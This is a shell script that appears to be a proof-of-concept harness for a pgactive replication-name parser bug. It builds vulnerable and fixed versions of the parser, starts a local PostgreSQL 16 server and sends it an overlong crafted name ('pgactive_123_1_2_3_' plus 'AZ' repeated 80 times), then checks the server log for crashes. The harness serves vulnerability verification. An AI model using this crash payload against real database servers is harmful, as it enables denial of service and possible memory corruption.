#!/bin/sh
# Real-PostgreSQL SQL path for the verbatim pinned parser. Provisioning is
# described in PROVISION.md; no external target is contacted. Extracted PG16
# binaries are used from PGBIN (default /tmp/pgactive-build/pg16root/usr/lib/postgresql/16/bin).
set -u
cd "$(dirname "$0")" || exit 1
PGBIN=${PGBIN:-/tmp/pgactive-build/pg16root/usr/lib/postgresql/16/bin}
PGINC=${PGINC:-/tmp/pgactive-build/pg16root/usr/include/postgresql/16/server}
PORT=${PORT:-58417}
ROOT=${PWD}
PGDATA=${ROOT}/pgdata
SOCK=${ROOT}/sock
mkdir -p evidence "$SOCK"
rm -rf "$PGDATA" evidence/server.log
ATTACK="pgactive_123_1_2_3_$(printf 'AZ%.0s' $(seq 1 80))"
echo "$ATTACK" > evidence/attack-name.txt

gcc -O0 -g -fPIC -fstack-protector-strong -shared -I"$PGINC" \
    parser.c -o parser-vuln.so 2>evidence/build-vuln.log
VULN_BUILD=$?
gcc -O0 -g -fPIC -fstack-protector-strong -DFIXED_BUILD -shared -I"$PGINC" \
    parser.c -o parser-fixed.so 2>evidence/build-fixed.log
FIXED_BUILD=$?
echo "BUILD vuln=$VULN_BUILD fixed=$FIXED_BUILD"
[ "$VULN_BUILD" -eq 0 ] && [ "$FIXED_BUILD" -eq 0 ] || exit 1

"$PGBIN/initdb" -D "$PGDATA" -A trust --no-sync --no-instructions >evidence/initdb.log 2>&1
echo "INITDB=$?"
"$PGBIN/pg_ctl" -D "$PGDATA" -l "$ROOT/evidence/server.log" -w start \
    -o "-p $PORT -k $SOCK -c listen_addresses=127.0.0.1" >evidence/pgstart.log 2>&1
echo "PGSTART=$?"
PSQL="$PGBIN/psql -h $SOCK -p $PORT -d postgres -X -q -v ON_ERROR_STOP=1"

$PSQL -v libdir="$ROOT/parser-vuln.so" -f setup.sql >evidence/vuln-setup.out 2>&1
echo "VULN_SETUP=$?"
$PSQL -c "SELECT * FROM pgactive_parse_replident_name('pgactive_123_1_2_3_');" \
    >evidence/vuln-safe.out 2>&1
echo "VULN_SAFE=$?"
$PSQL -c "SELECT * FROM pgactive_parse_replident_name('$ATTACK');" \
    >evidence/vuln-attack.out 2>&1
echo "VULN_ATTACK_PSQL_RC=$?"
grep -c 'was terminated by signal' evidence/server.log > evidence/vuln-server-terminations.txt

$PSQL -c 'DROP FUNCTION pgactive_parse_replident_name(text);' >evidence/fixed-drop.out 2>&1
$PSQL -v libdir="$ROOT/parser-fixed.so" -f setup.sql >evidence/fixed-setup.out 2>&1
echo "FIXED_SETUP=$?"
$PSQL -c "SELECT * FROM pgactive_parse_replident_name('pgactive_123_1_2_3_');" \
    >evidence/fixed-safe.out 2>&1
echo "FIXED_SAFE=$?"
$PSQL -c "SELECT * FROM pgactive_parse_replident_name('$ATTACK');" \
    >evidence/fixed-attack.out 2>&1
echo "FIXED_ATTACK_PSQL_RC=$?"

"$PGBIN/pg_ctl" -D "$PGDATA" -m fast -w stop >evidence/pgstop.log 2>&1
echo "PGSTOP=$?"
echo '--- vulnerable safe ---'; cat evidence/vuln-safe.out
echo '--- vulnerable attack ---'; cat evidence/vuln-attack.out
echo '--- fixed safe ---'; cat evidence/fixed-safe.out
echo '--- fixed attack ---'; cat evidence/fixed-attack.out
echo '--- server termination lines ---'; grep 'was terminated by signal' evidence/server.log || true
